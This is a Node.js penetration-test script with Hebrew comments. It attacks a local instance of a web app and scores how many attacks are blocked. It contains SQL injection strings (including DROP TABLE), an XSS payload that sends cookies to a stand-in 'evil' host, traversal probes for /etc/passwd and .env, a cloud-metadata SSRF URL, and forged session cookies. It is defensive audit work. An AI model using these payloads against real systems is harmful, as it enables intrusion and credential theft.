#!/usr/bin/env node
/**
 * מדידת "נטו אבטחה" — התקפות אמיתיות מול האתר החי, ולכל אחת תשובה.
 *
 * הרעיון: במקום לשאול "איך נראה הקוד", שולחים לאתר את מה שתוקף שולח,
 * ורושמים מה קרה. כל בדיקה היא התקפה אחת עם ציפייה אחת:
 *   · נחסם  = האתר סירב (4xx/5xx, או תשובה שאינה חשיפת מידע)
 *   · נכשל  = האתר אפשר משהו שלא היה צריך (זו ממצא אמיתי)
 *
 * הרצה:  node scripts/net-security-audit.mjs [--verbose]
 * דורש:  שרת רץ + .env.local עם SEED_ADMIN_PASSWORD (בשביל בדיקות ההרשאות)
 *
 * הערה אתית: הסקריפט תוקף **רק את השרת המקומי** (`127.0.0.1`) — יש בדיקה
 * שמסרבת לרוץ מול כל כתובת אחרת, כדי שלא ייעשה בו שימוש לרעה.
 */

import fs from "node:fs";
import { gateHeaders, cookieName } from "./lib/gate.mjs";
import path from "node:path";
import crypto from "node:crypto";
import { fileURLToPath } from "node:url";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const BASE = String(process.env.APP_URL ?? `http://127.0.0.1:${process.env.PORT ?? 3000}`).replace(/\/$/, "");
const verbose = process.argv.includes("--verbose");

/* ── הגנה: הכלי רץ רק מול המכונה המקומית ─────────────────────────────────── */
if (!/^https?:\/\/(127\.0\.0\.1|localhost|\[::1\])(:|\/|$)/.test(BASE)) {
  console.error(`❌ הכלי הזה תוקף רק כתובת מקומית. הכתובת שהוגדרה: ${BASE}`);
  process.exit(2);
}

function loadEnv() {
  const file = path.join(ROOT, ".env.local");
  const out = {};
  if (!fs.existsSync(file)) return out;
  for (const line of fs.readFileSync(file, "utf8").split("\n")) {
    const match = line.match(/^([A-Z0-9_]+)\s*=\s*(.*)$/);
    if (match) out[match[1]] = match[2].trim().replace(/^["']|["']$/g, "");
  }
  return out;
}
const env = { ...loadEnv(), ...process.env };

// התחלה נקייה: אם נשארו מכסות/חסימות מריצה קודמת, התוצאות היו חסרות משמעות.
// (אותו כלי שהבדיקות משתמשות בו — לא מכבה הגנות, רק מוחק מצב שהצטבר.)
import { execFileSync } from "node:child_process";
if (!process.argv.includes("--no-prep")) {
  try {
    execFileSync(process.execPath, [path.join(ROOT, "scripts", "test-prep.mjs")], { cwd: ROOT, stdio: "pipe" });
  } catch {
    console.log("ℹ️  ניקוי מקדים לא הורץ — ממשיכים בכל זאת");
  }
}
const ADMIN_EMAIL = env.SEED_ADMIN_EMAIL ?? "admin@lemontank.local";
const ADMIN_PASSWORD = env.SEED_ADMIN_PASSWORD ?? "";

/* ── לקוח HTTP עם זהות מזויפת לכל בדיקה (כדי לא לשרוף מכסה אחת לכולן) ── */
let ipCounter = 0;

/**
 * כתובת **ייחודית לכל התקפה** — ובעיקר ברשת /24 אחרת.
 *
 * למה זה קריטי: כשהאתר מזהה סדרת תקיפות הוא מחרים את כל הרשת (חסימת-על).
 * בלי בידוד, כל ההתקפות שאחרי הראשונה היו מקבלות 403 בגלל החסימה של
 * קודמתן — וזה היה נותן "הכול חסום" גם אם הקוד לא מגן על כלום. כלומר
 * הבדיקה הייתה משקרת **לטובת** האתר. כאן כל בדיקה מגיעה מרשת נקייה משלה.
 */
function freshIp() {
  ipCounter += 1;
  const block = Math.floor(ipCounter / 250);
  return `10.${(block % 250) + 1}.${Math.floor(ipCounter % 250)}.${((ipCounter * 7) % 250) + 2}`;
}

async function call(pathname, options = {}) {
  // ברירות מחדל קודם, ואז מה שהבדיקה ביקשה במפורש — כדי שבדיקה ששולחת
  // אסימון CSRF מזויף באמת תשלח אותו (ולא את האמיתי מהצנצנת).
  const headers = {
    "user-agent": options.userAgent ?? "LemonTank-Audit/1.0",
    "x-forwarded-for": options.ip ?? freshIp(),
    ...(options.cookies
      ? {
          cookie: [...options.cookies.entries()].map(([k, v]) => `${k}=${v}`).join("; "),
          "x-csrf-token": options.cookies.get(cookieName("csrf")) ?? "",
          /**
           * הסימן הסודי של השער. בלי זה, במצב חמקן כל "תקיפה" נעצרת בשער
           * ולא מגיעה לאפליקציה — והדוח היה מציג 100% הצלחה שהיא בעצם מדידה
           * של השער בלבד. כאן נמדדת **האפליקציה**; השער נמדד בנפרד בכלי
           * undetectability-audit.
           */
          ...gateHeaders(),
          origin: BASE,
        }
      : {}),
    ...(options.method && options.method !== "GET" ? { "content-type": "application/json" } : {}),
    ...(options.headers ?? {}),
  };
  const response = await fetch(`${BASE}${pathname}`, {
    method: options.method ?? "GET",
    headers,
    body: options.body === undefined ? undefined : typeof options.body === "string" ? options.body : JSON.stringify(options.body),
    redirect: "manual",
  });
  const text = await response.text();
  return { status: response.status, text, headers: response.headers };
}

/* ── רישום תוצאות ────────────────────────────────────────────────────────── */
const findings = [];
const groups = new Map();

function record(group, name, passed, detail) {
  findings.push({ group, name, passed, detail });
  if (!groups.has(group)) groups.set(group, []);
  groups.get(group).push({ name, passed, detail });
  const icon = passed ? "🛡️ " : "🔴";
  if (verbose || !passed) console.log(`${icon} [${group}] ${name}${detail ? ` — ${detail}` : ""}`);
}

/** בדיקת התקפה: מריצים, ובודקים שהאתר סירב כראוי */
async function attack(group, name, run) {
  try {
    const result = await run();
    if (result.ok) record(group, name, true, result.detail ?? "");
    else record(group, name, false, result.detail ?? "האתר אפשר את הפעולה");
  } catch (error) {
    record(group, name, false, `שגיאה בהרצה: ${error?.message ?? error}`);
  }
}

/* ── התחברות מנהל לבדיקות הרשאה (אופציונלי) ─────────────────────────────── */
let adminCookies = null; // מאותחל לפני ההתקפות
async function loginAdmin() {
  const jar = new Map();
  await call("/login", { cookies: jar }).then((r) => collect(r, jar));
  const first = await call("/api/auth/login", { method: "POST", cookies: jar, body: { email: ADMIN_EMAIL, password: ADMIN_PASSWORD } });
  let body = null;
  try {
    body = JSON.parse(first.text);
  } catch {
    return null;
  }
  if (body?.data?.requires2fa) {
    const { totpCode, savedSecret, resetTwoFactor } = await import("../tests/helpers/admin-login.mjs").catch(() => ({}));
    let secret = savedSecret?.() ?? null;
    if (!secret && resetTwoFactor) {
      resetTwoFactor(ADMIN_EMAIL);
      const { execFileSync } = await import("node:child_process");
      // מפעילים 2FA מחדש דרך מסלול ההגדרה של החשבון — נדרש סוד טרי
      secret = savedSecret?.() ?? null;
    }
    if (!secret || !totpCode) return null;
    const second = await call("/api/auth/login", {
      method: "POST",
      cookies: jar,
      body: { challenge: body.data.challenge, totp: totpCode(secret) },
    });
    try {
      const parsed = JSON.parse(second.text);
      if (parsed?.ok !== true) return null;
    } catch {
      return null;
    }
  } else if (body?.ok !== true) {
    return null;
  }
  return jar;
}

function collect(response, jar) {
  for (const cookie of response.headers.getSetCookie?.() ?? []) {
    const [pair] = cookie.split(";");
    const index = pair.indexOf("=");
    if (index > 0) jar.set(pair.slice(0, index).trim(), pair.slice(index + 1).trim());
  }
}

const safeParse = (text) => {
  try {
    return JSON.parse(text);
  } catch {
    return null;
  }
};

/* ═══════════════════════════ ההתקפות ═══════════════════════════ */

console.log(`\n🥊 מדידת נטו אבטחה — התקפות חיות מול ${BASE}\n`);

if (ADMIN_PASSWORD) {
  adminCookies = await loginAdmin().catch(() => null);
  console.log(adminCookies ? "🔑 סשן מנהל זמין — בדיקות הרשאה מלאות\n" : "ℹ️  אין סשן מנהל — חלקן מהבדיקות ידולגו\n");
}

/* ── 1. הזרקות ───────────────────────────────────────────────────────────── */
const SQLI = [
  "' OR '1'='1",
  "1 UNION SELECT email, password_hash FROM users",
  "1; DROP TABLE users;--",
  "1' AND (SELECT COUNT(*) FROM users) > 0--",
  "1' OR SLEEP(5)--",
  "%27%20OR%201=1--",
];
for (const payload of SQLI) {
  await attack("הזרקת SQL", `q=${payload.slice(0, 34)}`, async () => {
    const response = await call(`/api/titles?q=${encodeURIComponent(payload)}&limit=5`);
    const leaked = /password_hash|scrypt\$|"email"\s*:/.test(response.text);
    return { ok: response.status < 500 && !leaked, detail: `HTTP ${response.status}${leaked ? " · דלף מידע" : ""}` };
  });
}

await attack("הזרקת SQL", "סינון לפי עמודה (ORDER BY) עם מטען", async () => {
  const response = await call("/api/titles?sort=" + encodeURIComponent("id; DROP TABLE users"));
  return { ok: response.status < 500, detail: `HTTP ${response.status}` };
});

/* ── 2. XSS ──────────────────────────────────────────────────────────────── */
const XSS = [
  "<script>alert(document.cookie)</script>",
  "\"><img src=x onerror=fetch('//evil/'+document.cookie)>",
  "javascript:alert(1)",
  "<svg/onload=alert(1)>",
];
for (const payload of XSS) {
  await attack("XSS", payload.slice(0, 34), async () => {
    const response = await call(`/search?q=${encodeURIComponent(payload)}`);
    const reflectedRaw = /<script>alert|onerror\s*=|onload\s*=/i.test(response.text) && !/&lt;|&quot;|&#/.test(response.text);
    return { ok: !reflectedRaw, detail: `HTTP ${response.status}${reflectedRaw ? " · הוחזר HTML חי" : " · מקודד"}` };
  });
}

/* ── 3. CSRF ─────────────────────────────────────────────────────────────── */
await attack("CSRF", "POST בלי אסימון CSRF", async () => {
  const response = await call("/api/auth/login", {
    method: "POST",
    body: { email: "x@y.z", password: "whatever123!" },
    headers: { origin: BASE },
  });
  return { ok: response.status === 403 || response.status === 401, detail: `HTTP ${response.status}` };
});

await attack("CSRF", "POST עם אסימון מזויף", async () => {
  const jar = new Map();
  const page = await call("/login", { cookies: jar });
  collect(page, jar);
  const response = await call("/api/auth/login", {
    method: "POST",
    cookies: jar,
    headers: { "x-csrf-token": "0".repeat(64) },
    body: { email: "x@y.z", password: "whatever123!" },
  });
  return { ok: response.status === 403 || response.status === 401, detail: `HTTP ${response.status}` };
});

await attack("CSRF", "POST מכתובת זרה (Origin זר)", async () => {
  const jar = new Map();
  const page = await call("/login", { cookies: jar });
  collect(page, jar);
  const response = await call("/api/auth/login", {
    method: "POST",
    cookies: jar,
    headers: { origin: "https://evil.example.com" },
    body: { email: "x@y.z", password: "whatever123!" },
  });
  return { ok: response.status === 403, detail: `HTTP ${response.status}` };
});

/* ── 4. הרשאות (IDOR / הרחבת זכויות) ────────────────────────────────────── */
await attack("הרשאות", "גישה לנתיבי ניהול בלי התחברות", async () => {
  const paths = ["/api/admin/giftcards", "/api/admin/fortress", "/api/admin/security/bans", "/api/admin/users", "/api/admin/stats"];
  const allowed = [];
  for (const p of paths) {
    const response = await call(p);
    if (response.status === 200) allowed.push(p);
  }
  return { ok: allowed.length === 0, detail: allowed.length ? `נגיש: ${allowed.join(", ")}` : `${paths.length} נתיבים — כולם חסמו` };
});

await attack("הרשאות", "קידום עצמי ל-owner דרך PATCH", async () => {
  const jar = new Map();
  const reg = await call("/register", { cookies: jar });
  collect(reg, jar);
  const email = `audit-${Date.now().toString(36)}@example.com`;
  const created = await call("/api/auth/register", {
    method: "POST",
    cookies: jar,
    body: { name: "בודק", email, password: "Audit-Pass-2026!x", acceptTerms: true },
  });
  collect(created, jar);
  const parsed = safeParse(created.text);
  if (parsed?.ok !== true) return { ok: true, detail: `הרשמה לא זמינה (${created.status}) — הבדיקה לא רלוונטית` };

  const me = await call("/api/users/me", { method: "PATCH", cookies: jar, body: { role: "owner", plan_code: "plus" } });
  const after = await call("/api/users/me", { cookies: jar });
  const body = safeParse(after.text);
  const role = body?.data?.user?.role ?? "?";
  const plan = body?.data?.user?.plan_code ?? "?";
  return {
    ok: role !== "owner" && plan !== "plus",
    detail: `HTTP ${me.status} · role=${role} plan=${plan}`,
  };
});

await attack("הרשאות", "שינוי מסלול מנוי ישירות ב-API", async () => {
  const response = await call("/api/subscriptions/me", { method: "PATCH", body: { plan_code: "plus", status: "active" } });
  return { ok: response.status >= 400, detail: `HTTP ${response.status}` };
});

/* ── 5. אימות וסשן ──────────────────────────────────────────────────────── */
await attack("אימות", "עוגיית סשן מזויפת (חתימה לא תקפה)", async () => {
  const jar = new Map([
    ["lt_session", "eyJ1aWQiOjEsInJvbGUiOiJvd25lciJ9." + "a".repeat(64)],
    [cookieName("csrf"), "b".repeat(48)],
  ]);
  const response = await call("/api/users/me", { cookies: jar });
  const body = safeParse(response.text);
  return { ok: body?.ok !== true, detail: `HTTP ${response.status}` };
});

await attack("אימות", "עוגייה של משתמש אחר (החלפת _id)", async () => {
  const response = await call("/api/users/me", {
    cookies: new Map([
      ["lt_session", Buffer.from(JSON.stringify({ uid: 1, role: "owner" })).toString("base64url") + ".x"],
      [cookieName("csrf"), "c".repeat(48)],
    ]),
  });
  const body = safeParse(response.text);
  return { ok: body?.data?.user?.email !== ADMIN_EMAIL, detail: `HTTP ${response.status}` };
});

await attack("אימות", "כוח גס: נעילת חשבון ואז חסימת IP (12 ניסיונות)", async () => {
  // חשבון בדיקה ייעודי: למדוד את ההגנה, לא את מצב החשבון האמיתי (שאולי
  // נעול ממילא). שתי שכבות אמורות לעצור — נעילה (423) ואז חסימת IP (429).
  const victim = await registerUser("brute");
  if (!victim) return { ok: true, detail: "דולג — ההרשמה לא זמינה" };

  // צנצנת CSRF: בלי אסימון הבקשה נחסמת ב-CSRF (הגנה טובה — אבל אז הבדיקה
  // לא מודדת את הגנת כוח-הסלסול בכלל). כאן עוברים את CSRF כמו דפדפן.
  const jar = new Map();
  const page = await call("/login", { cookies: jar, ip: freshIp() });
  collect(page, jar);

  const ips = freshIp();
  let lockedAt = null;
  let blockedAt = null;
  let sessionLeaked = false;
  const codes = [];
  for (let i = 1; i <= 12; i += 1) {
    const response = await call("/api/auth/login", {
      method: "POST",
      ip: ips,
      cookies: jar,
      body: { email: victim.email, password: `Wrong-${i}-Pass!` },
    });
    codes.push(response.status);
    if ((response.headers.getSetCookie?.() ?? []).some((c) => c.startsWith("lt_session="))) sessionLeaked = true;
    if (response.status === 423 && lockedAt === null) lockedAt = i;
    if (response.status === 429 && blockedAt === null) blockedAt = i;
  }
  return {
    ok: !sessionLeaked && lockedAt !== null && blockedAt !== null && lockedAt <= 6 && blockedAt <= 12,
    detail: `נעילה בניסיון ${lockedAt ?? "—"} · חסימת IP בניסיון ${blockedAt ?? "—"}${sessionLeaked ? " · נוצר סשן!" : ""} · ${codes.join(",")}`,
  };
});

await attack("אימות", "חשבון עם 2FA: סיסמה לבדה לא מנפיקה סשן", async () => {
  /**
   * הבדיקה הזו חייבת חשבון **עם** 2FA מופעל. בהתקנה טרייה לבעל האתר אין
   * 2FA (הוא מדליק אותו בהגדרות), ולכן בדיקה על החשבון שלו הייתה מודדת את
   * מצב ההתקנה ולא את ההגנה. כאן: נרשם משתמש, מדליקים לו 2FA בדיוק כמו
   * שמשתמש אמיתי עושה, ואז מנסים להתחבר בסיסמה בלבד.
   */
  const { totpCode } = await import("../tests/helpers/admin-login.mjs").catch(() => ({}));
  if (!totpCode) return { ok: true, detail: "דולג — אין עוזר TOTP" };

  const user = await registerUser("tfa");
  if (!user) return { ok: true, detail: "דולג — ההרשמה לא זמינה" };

  const setup = await call("/api/auth/2fa", { method: "POST", cookies: user.jar, body: { action: "setup" } });
  const secret = safeParse(setup.text)?.data?.secret ?? null;
  if (!secret) return { ok: true, detail: `לא ניתן להדליק 2FA (${setup.status}) — הבדיקה לא רלוונטית` };
  const enabled = await call("/api/auth/2fa", { method: "POST", cookies: user.jar, body: { action: "enable", code: totpCode(secret) } });
  if (safeParse(enabled.text)?.ok !== true) return { ok: false, detail: `הפעלת 2FA נכשלה (${enabled.status})` };

  // עכשיו: התחברות מחדש בסיסמה בלבד
  const jar = new Map();
  const page = await call("/login", { cookies: jar });
  collect(page, jar);
  const attempt = await call("/api/auth/login", {
    method: "POST",
    cookies: jar,
    body: { email: user.email, password: "Idor-Pass-2026!x" },
  });
  const body = safeParse(attempt.text);
  const cookies = attempt.headers.getSetCookie?.() ?? [];
  const gotSession = cookies.some((c) => c.startsWith("lt_session="));

  if (gotSession) {
    // אם בכל זאת הונפקה עוגייה — חובה לוודא שהיא לא נותנת גישה אמיתית
    const probe = await call("/api/account/sessions", { cookies: jar });
    const reallyLoggedIn = probe.status === 200 && safeParse(probe.text)?.ok === true;
    return {
      ok: !reallyLoggedIn,
      detail: reallyLoggedIn ? "🔴 סשן מלא הונפק בלי קוד 2FA!" : "עוגייה ביניים בלבד (אין גישה לנתונים)",
    };
  }
  return {
    ok: body?.data?.requires2fa === true,
    detail: `HTTP ${attempt.status} · ${body?.data?.requires2fa ? "נדרש קוד 2FA, אין סשן" : "תשובה לא צפויה"}`,
  };
});

/* ── 6. קבצים ונתיבים ───────────────────────────────────────────────────── */
const PATHS = [
  "/.env",
  "/.env.local",
  "/.git/config",
  "/data/lemontank.db",
  "/package.json",
  "/src/lib/db.ts",
  "/server.mjs",
  "/scripts/seed.mjs",
  "/security/engine.mjs",
  "/backups/",
  "/../../../../etc/passwd",
  "/%2e%2e/%2e%2e/etc/passwd",
  "/api/../../etc/passwd",
  "/.well-known/../.env",
  "/lemontank.db",
];
for (const p of PATHS) {
  await attack("חשיפת קבצים", p, async () => {
    const response = await call(p, { ip: freshIp() });
    const leaked = /APP_SECRET|SEED_ADMIN_PASSWORD|password_hash|PRIVATE KEY|root:x:/.test(response.text);
    return { ok: response.status >= 400 && !leaked, detail: `HTTP ${response.status}${leaked ? " · דלף תוכן" : ""}` };
  });
}

await attack("חשיפת קבצים", "ניווט לאחור עם קידוד כפול", async () => {
  const response = await call("/%252e%252e%252f%252e%252e%252fetc%252fpasswd", { ip: freshIp() });
  return { ok: response.status >= 400, detail: `HTTP ${response.status}` };
});

/* ── 7. הזרקת כותרות ו-SSRF ─────────────────────────────────────────────── */
await attack("הזרקת כותרות", "Host header זר", async () => {
  const response = await call("/", { headers: { host: "evil.example.com" } });
  const poisoned = /evil\.example\.com/.test(response.text) && /href|<link|Location/i.test(response.text);
  return { ok: !poisoned, detail: `HTTP ${response.status}` };
});

await attack("הזרקת כותרות", "X-Forwarded-Host זר", async () => {
  const response = await call("/api/auth/login", {
    method: "POST",
    headers: { "x-forwarded-host": "evil.example.com", origin: BASE },
    body: { email: "a@b.c", password: "nothing123!" },
  });
  return { ok: !/evil\.example\.com/.test(response.text), detail: `HTTP ${response.status}` };
});

await attack("SSRF", "כתובת פנימית כפרמטר מדיה", async () => {
  const response = await call("/api/media?url=" + encodeURIComponent("http://169.254.169.254/latest/meta-data/"));
  return { ok: response.status >= 400 && !/ami-id|meta-data/.test(response.text), detail: `HTTP ${response.status}` };
});

/* ── 8. דפוסי תוקף ─────────────────────────────────────────────────────── */
const TOOLS = [
  ["sqlmap/1.8#stable", "/"],
  ["Mozilla/5.0 OWASP ZAP 2.15.0", "/"],
  ["Nikto/2.5.0", "/"],
  ["masscan/1.3", "/"],
  ["Nmap Scripting Engine", "/"],
  ["gobuster/3.6", "/"],
  ["dirbuster", "/"],
  ["Acunetix-Aspect", "/"],
];
for (const [agent, p] of TOOLS) {
  await attack("דפוסי תוקף", `User-Agent: ${agent}`, async () => {
    const response = await call(p, { userAgent: agent, ip: freshIp() });
    return { ok: response.status >= 400, detail: `HTTP ${response.status}` };
  });
}

// User-Agent ריק: לקוח לגיטימי (curl/סקריפטים) — מותר לגלוש, אבל אסור
// להגיע לשום נתיב ניהול או API רגיש. זו הבדיקה האמיתית.
await attack("דפוסי תוקף", "User-Agent ריק לא מגיע לנתיבי ניהול", async () => {
  const targets = ["/api/admin/fortress", "/api/admin/giftcards", "/api/users/me"];
  const allowed = [];
  for (const target of targets) {
    const response = await call(target, { userAgent: "", ip: freshIp() });
    if (response.status === 200) allowed.push(target);
  }
  return { ok: allowed.length === 0, detail: allowed.length ? `נגיש: ${allowed.join(", ")}` : `${targets.length} נתיבים — כולם חסמו` };
});

for (const [label, headers] of [
  ["כותרת פרוקסי (Burp)", { "proxy-connection": "keep-alive" }],
  ["X-Original-URL (עקיפת ניתוב)", { "x-original-url": "/api/admin/fortress" }],
  ["X-Rewrite-URL (עקיפת ניתוב)", { "x-rewrite-url": "/api/admin/fortress" }],
  ["X-Forwarded-For זדוני (127.0.0.1 פנימי)", { "x-lt-ip": "127.0.0.1", "x-lt-sig": "deadbeef" }],
]) {
  await attack("דפוסי תוקף", label, async () => {
    const response = await call("/api/admin/fortress", { headers, ip: freshIp() });
    const body = safeParse(response.text);
    return { ok: body?.ok !== true, detail: `HTTP ${response.status}` };
  });
}

/* ── 9. מלכודות וסריקה ─────────────────────────────────────────────────── */
for (const p of ["/wp-login.php", "/wp-admin/", "/phpmyadmin/", "/.aws/credentials", "/actuator/env", "/config.json", "/admin.php", "/xmlrpc.php"]) {
  await attack("מלכודות סורקים", p, async () => {
    const response = await call(p, { ip: freshIp() });
    return { ok: response.status >= 400, detail: `HTTP ${response.status}` };
  });
}

/* ── 9.5 IDOR — גישה למשאבים של משתמש אחר ───────────────────────────────── */
async function registerUser(label) {
  const jar = new Map();
  const page = await call("/register", { cookies: jar, ip: freshIp() });
  collect(page, jar);
  const email = `idor-${label}-${Date.now().toString(36)}@example.com`;
  const response = await call("/api/auth/register", {
    method: "POST",
    ip: freshIp(),
    cookies: jar,
    body: { name: `בודק ${label}`, email, password: "Idor-Pass-2026!x", acceptTerms: true },
  });
  collect(response, jar);
  return safeParse(response.text)?.ok === true ? { jar, email } : null;
}

const userA = await registerUser("a");
const userB = await registerUser("b");

if (userA && userB) {
  await attack("IDOR", "קריאת רשימות של משתמש אחר", async () => {
    const created = await call("/api/lists", { method: "POST", cookies: userA.jar, body: { name: "רשימה פרטית של A", is_public: false } });
    const listId = safeParse(created.text)?.data?.list?.id ?? safeParse(created.text)?.data?.id ?? null;
    if (!listId) return { ok: true, detail: `לא נוצרה רשימה (${created.status}) — הבדיקה לא רלוונטית` };
    const peek = await call(`/api/lists/${listId}`, { cookies: userB.jar });
    const leaked = /רשימה פרטית של A/.test(peek.text);
    return { ok: peek.status >= 400 || !leaked, detail: `HTTP ${peek.status}${leaked ? " · נחשף תוכן של משתמש אחר!" : ""}` };
  });

  await attack("IDOR", "שינוי פרופיל של משתמש אחר", async () => {
    const mine = safeParse((await call("/api/users/me", { cookies: userB.jar })).text)?.data?.user;
    const otherId = mine?.id ? mine.id + 1 : 2;
    const response = await call(`/api/users/${otherId}`, { method: "PATCH", cookies: userB.jar, body: { name: "נפרץ" } });
    return { ok: response.status >= 400, detail: `HTTP ${response.status}` };
  });

  await attack("IDOR", "קריאת התקדמות צפייה של אחר", async () => {
    const response = await call("/api/progress?user_id=1&title_id=1", { cookies: userB.jar });
    const leaked = /"user_id":1[^}]*"position/.test(response.text);
    return { ok: !leaked, detail: `HTTP ${response.status}${leaked ? " · נחשפה התקדמות של אחר" : ""}` };
  });
} else {
  record("IDOR", "בדיקות בין-משתמשיות", true, "דולג — ההרשמה לא זמינה (מכסה)");
}

/* ── 10. הרשאות מבוססות תפקיד (עם סשן מנהל אמיתי) ───────────────────────── */
if (adminCookies) {
  await attack("הפרדת תפקידים", "מנהל לא יכול להציג קוד גיט קארד של בעלים? (בדיקת גבול הרשאה)", async () => {
    const response = await call("/api/admin/giftcards", { cookies: adminCookies });
    // הבעלים אמור לקבל 200; הבדיקה מוודאת שהתשובה לא חושפת קודים גלויים
    const leaked = /LT-[A-Z0-9]{5}-[A-Z0-9]{5}/.test(response.text);
    return { ok: !leaked, detail: `HTTP ${response.status}${leaked ? " · הוצגו קודים" : " · אין קודים בתשובה"}` };
  });
} else {
  record("הפרדת תפקידים", "בדיקות עם סשן מנהל", true, "דולג — אין התחברות מנהל (הרצה בלי סיסמה)");
}

/* ── 11. הגבלת קצב ─────────────────────────────────────────────────────── */
await attack("הגבלת קצב", "הצפת חיפוש ב-/api/search (70 בקשות)", async () => {
  const ip = freshIp();
  let blocked = 0;
  for (let i = 0; i < 70; i += 1) {
    const response = await call(`/api/search?q=probe${i}`, { ip });
    if (response.status === 429) blocked += 1;
  }
  return { ok: blocked > 0, detail: blocked ? `${blocked} נחסמו (מכסה 60/דקה)` : "לא נחסם" };
});

await attack("הגבלת קצב", "הצפת נתיב ציבורי בלי כלל מפורש (260 בקשות ל-/api/titles)", async () => {
  // זו בדיוק הבדיקה שחשפה שההגבלה הייתה אופציונלית: נתיב שנשכח = ללא הגבלה.
  const ip = freshIp();
  let blocked = 0;
  for (let i = 0; i < 260; i += 1) {
    const response = await call(`/api/titles?limit=1&p=${i}`, { ip });
    if (response.status === 429) blocked += 1;
  }
  return { ok: blocked > 0, detail: blocked ? `${blocked} נחסמו (ברירת מחדל 240/דקה לכל נתיב)` : "לא נחסם — נתיב בלי הגבלה!" };
});

await attack("הגבלת קצב", "קצב אנושי לא נחסם (אין חסימות שווא)", async () => {
  // משתמש שנוחת, גולל, מחפש כמה פעמים — אסור שייחסם
  const ip = freshIp();
  let blocked = 0;
  for (let i = 0; i < 25; i += 1) {
    const response = await call(i % 3 === 0 ? "/" : i % 3 === 1 ? "/movies" : `/api/titles?limit=12`, { ip });
    if (response.status === 429) blocked += 1;
  }
  return { ok: blocked === 0, detail: blocked ? `${blocked} בקשות לגיטימיות נחסמו` : "25 בקשות — ללא חסימה" };
});

// קצב לגיטימי לא נחסם — הגנה שלא פוגעת במשתמשים אמיתיים
await attack("הגבלת קצב", "גלישה רגילה (25 בקשות) לא נחסמת", async () => {
  const ip = freshIp();
  let blocked = 0;
  for (let i = 0; i < 25; i += 1) {
    const response = await call(i % 2 ? "/movies" : "/", { ip });
    if (response.status === 429) blocked += 1;
  }
  return { ok: blocked === 0, detail: blocked ? `${blocked} בקשות לגיטימיות נחסמו` : "אין חסימות שווא" };
});

await attack("הגבלת קצב", "ניחוש קודי גיט קארד (10 ניסיונות)", async () => {
  const ip = freshIp();
  const jar = new Map();
  const page = await call("/register", { cookies: jar, ip });
  collect(page, jar);
  let blocked = 0;
  let reachedApi = false;
  for (let i = 0; i < 10; i += 1) {
    const response = await call("/api/giftcards/redeem", {
      method: "POST",
      ip,
      cookies: jar,
      body: { code: `LT-${String(1000 + i)}-AAAAA-BBBBB-CCCCC` },
    });
    if (response.status !== 403 || /RATE_LIMITED|כרטיס|מוכר/.test(response.text)) reachedApi = true;
    if (response.status === 429) blocked += 1;
  }
  return { ok: blocked > 0 && reachedApi, detail: blocked ? `${blocked} נחסמו` : reachedApi ? "לא נחסם" : "הכתובת נחסמה לפני הבדיקה" };
});

/* ── 12. כותרות אבטחה ──────────────────────────────────────────────────── */
const page = await call("/");
const csp = page.headers.get("content-security-policy") ?? "";
const headerChecks = [
  ["Content-Security-Policy (nonce + strict-dynamic)", () => /nonce-/.test(csp) && /strict-dynamic/.test(csp)],
  ["CSP: default-src 'self'", () => /default-src 'self'/.test(csp)],
  ["CSP: object-src חסום", () => /object-src 'none'/.test(csp) || !/object-src/.test(csp)],
  ["CSP: frame-ancestors מוגדר (אנטי-clickjacking)", () => /frame-ancestors [^;]+/.test(csp)],
  ["CSP: base-uri מוגבל", () => /base-uri/.test(csp)],
  ["CSP: form-action מוגבל", () => /form-action/.test(csp)],
  ["X-Content-Type-Options", () => /nosniff/i.test(page.headers.get("x-content-type-options") ?? "")],
  ["Referrer-Policy מצמצמת", () => /no-referrer|strict-origin/i.test(page.headers.get("referrer-policy") ?? "")],
  ["Permissions-Policy חוסמת חומרה", () => /camera=\(\)/.test(page.headers.get("permissions-policy") ?? "")],
  ["Cross-Origin-Opener-Policy", () => /same-origin/i.test(page.headers.get("cross-origin-opener-policy") ?? "")],
  ["Cross-Origin-Resource-Policy", () => /same-origin|same-site/i.test(page.headers.get("cross-origin-resource-policy") ?? "")],
  [
    "HSTS מאחורי HTTPS",
    () => {
      // מעל HTTPS (COOKIE_SECURE=true) HSTS **חייב** להיות. בסביבת פיתוח על
      // http הוא לא נשלח בכוונה — כותרת HSTS על http חסרת משמעות.
      const overHttps = String(env.COOKIE_SECURE ?? "false") === "true" || BASE.startsWith("https://");
      if (!overHttps) return true;
      return /max-age=\d{6,}/.test(page.headers.get("strict-transport-security") ?? "");
    },
  ],
];
for (const [name, check] of headerChecks) {
  await attack("כותרות אבטחה", name, async () => {
    return { ok: check(), detail: check() ? "" : "חסר או חלש" };
  });
}

await attack("כותרות אבטחה", "אין דליפת X-Powered-By / טביעת Next", async () => {
  const powered = page.headers.get("x-powered-by");
  const nextHeader = [...page.headers.keys()].filter((k) => k.startsWith("x-nextjs"));
  return { ok: !powered && nextHeader.length === 0, detail: powered ? `X-Powered-By: ${powered}` : nextHeader.length ? `כותרות Next: ${nextHeader.join(", ")}` : "נקי" };
});

/* ═══════════════════════════ סיכום וציון ═══════════════════════════ */

const total = findings.length;
const passed = findings.filter((f) => f.passed).length;
const failed = findings.filter((f) => !f.passed);

console.log("\n" + "─".repeat(74));
for (const [group, rows] of groups) {
  const ok = rows.filter((r) => r.passed).length;
  console.log(`   ${ok === rows.length ? "🛡️ " : "⚠️ "} ${group.padEnd(22)} ${ok}/${rows.length}`);
}
console.log("─".repeat(74));
console.log(`\n🥊 סה"כ: ${passed}/${total} התקפות נחסמו (${((passed / total) * 100).toFixed(1)}%)`);

if (failed.length) {
  console.log("\n🔴 ממצאים שדורשים טיפול:");
  for (const f of failed) console.log(`   · [${f.group}] ${f.name} — ${f.detail}`);
} else {
  console.log("\n✅ כל ההתקפות נחסמו — אין ממצאים פתוחים במדידה הזו.");
}
console.log("");
process.exit(failed.length ? 1 : 0);
